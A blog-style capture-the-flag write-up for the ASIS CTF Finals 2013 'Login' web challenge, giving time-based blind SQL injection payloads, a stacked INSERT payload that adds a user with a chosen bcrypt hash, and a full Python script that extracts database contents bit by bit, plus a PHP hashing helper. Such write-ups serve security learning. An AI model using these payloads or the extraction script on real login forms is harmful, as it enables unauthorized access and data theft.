---
layout: post
title: "ASIS CTF Finals 2013 Login"
description: ""
category: writeup
tags: [ASIS CTF Finals 2013, web]
---
{% include JB/setup %}

Description

	Login
	
	Points	350		Level	1	Solves	5
	
	Description
	78.38.193.187
	
	Hint:
	$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG


All you can see is a login form, it always has some SQL injection problem.

After a lot of testing, finally we find a time-based blind injection in the username.

Using
	
	1' AND BENCHMARK(5000000,MD5(0x123)) AND ''='
	
then we start to using sqlmap to deal with it, but it is too slow and show some mistakes.

One of my friend write a python script to solve it, then we find some useful infomation. There are three database:

	information_schema
	sqli_db
	test
	
Obviously, sqli_db is suspicious, let's see what it has.

	users
	
It only has a table named users.

	user_id
	user_name
	user_email
	user_password_hash
	
At the beginning, we trying to fetch some data from it, but it is empty, some time later, we fetch a string from user_password_hash.

	$2y$10$gyI0vxnE3ZncmdLNGVmwTew/aPwBZPY4cEMCRENAjN4?0l8iu9O5R6iW

Just google "$2y$10", we find it is the head of PHP blowfish hash, but it seems that there is no way to get the original value from it.

At that time, the admin give a hint on this problem:

	Hint:
	$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
	
At the same time, we find that the table users suddenly become empty. It inspire us to try INSERT.

	';insert into users values (333,'hqd','1','1@1.com');select '

And it works!

Then it is so easy, just INSERT the correct hash value of a password u know it before, there is a php script can to do this.

	';insert into users values (333,'hqd','$2y$10$YTNlM2RiNmFiODgzZGM2YuYqP7NHnuZ31TyucetPJkODqia/XH5KC','1@1.com');select '
	
	#this is the blowfish hash value of 'admin'
	
Then just login use username:hqd and password:admin, then here is the flag.

	ASIS_9689926853009CAAD5BF824863077DC9

And taste the flavor of the first blood.

f.py

{% highlight python linenos%}
from httplib import HTTPConnection

HTTPConnection._http_vsn_str = 'HTTP/1.0'

def post_payload( payload ):
	conn = HTTPConnection( '78.38.193.187' )
	conn.putrequest( 'POST', '/', skip_accept_encoding=True, skip_host=True )
	conn.putheader( 'Content-Type', 'application/x-www-form-urlencoded' )
	conn.putheader( 'Content-Length', str(len(payload)) )
	conn.endheaders( message_body=payload )
	resp = conn.getresponse()
	resp.read()

from urllib import urlencode
from time import time

def get_bool( expression ):
	start = time()
	post_payload( urlencode( dict(
		login = '',
		user_password = ' ',
		user_name = "'OR if(%s,benchmark(1500000,md5(0)),0) AND''='" % expression,
	) ) )
	end = time()
	print 'Time:', end-start
	return end-start>0.95

def get_bit( expression ):
	return '1' if get_bool( expression ) else '0'

from itertools import count

def get_string( expression ):
	result = ''
	for i in count( start=1 ):
		char = ''
		for j in range(8)[::-1]:
			print 'Byte %d, Bit %d,' % (i,j),
			bit = get_bit( 'ascii(substr(%s,%d,1))>>%d&1' % ( expression, i, j ) )
			print bit
			char += bit
		char = int( char, 2 )
		if char == 0: break
		result += chr(char)
	return result

# def get_query( expression ):
	

# print get_string( 'database()' )
print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c695f6462 LIMIT 0,1)' )
# print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'information_shema\' LIMIT 0,1)' )
# print get_string( '(SELECT IFNULL(CAST(COLUMN_NAME AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'users\' LIMIT 5,1)' )
# print get_string( '(SELECT CAST(COUNT(*) AS CHAR) FROM users)' )
# print get_string( '@@datadir' )
# print get_string( 'user()' )
# print get_string( 'version()' )


{% endhighlight %} 


a.php

Found from [pastebin](http://pastebin.com/y9GKtx0b)

{% highlight php linenos%}

<?php
// demo = $2y$10$Zjk5YzQ4ZTlhMzNlNTUzMO3Wnm1FqXmAb6/4DmyptNGoEdWGLwls.
       
function password_encrypt($password) {
  $hash_format = "$2y$10$";   // Tells PHP to use Blowfish with a "cost" of 10
  $salt_length = 22;                    // Blowfish salts should be 22-characters or more
  $salt = generate_salt($salt_length);
  $format_and_salt = $hash_format . $salt;
  $hash = crypt($password, $format_and_salt);
    return $hash;
}
 
function generate_salt($length) {
  // Not 100% unique, not 100% random, but good enough for a salt
  // MD5 returns 32 characters
  $unique_random_string = md5(uniqid(mt_rand(), true));
    // Valid characters for a salt are [a-zA-Z0-9./]
  $base64_string = base64_encode($unique_random_string);
    // But not '+' which is valid in base64 encoding
  $modified_base64_string = str_replace('+', '.', $base64_string);
    // Truncate string to the correct length
  $salt = substr($modified_base64_string, 0, $length);
    return $salt;
}
 
function password_check($password, $existing_hash) {
    // existing hash contains format and salt at start
  $hash = crypt($password, $existing_hash);
  if ($hash === $existing_hash) {
    return true;
  } else {
    return false;
  }
}

echo password_encrypt('admin');
?>

{% endhighlight %} 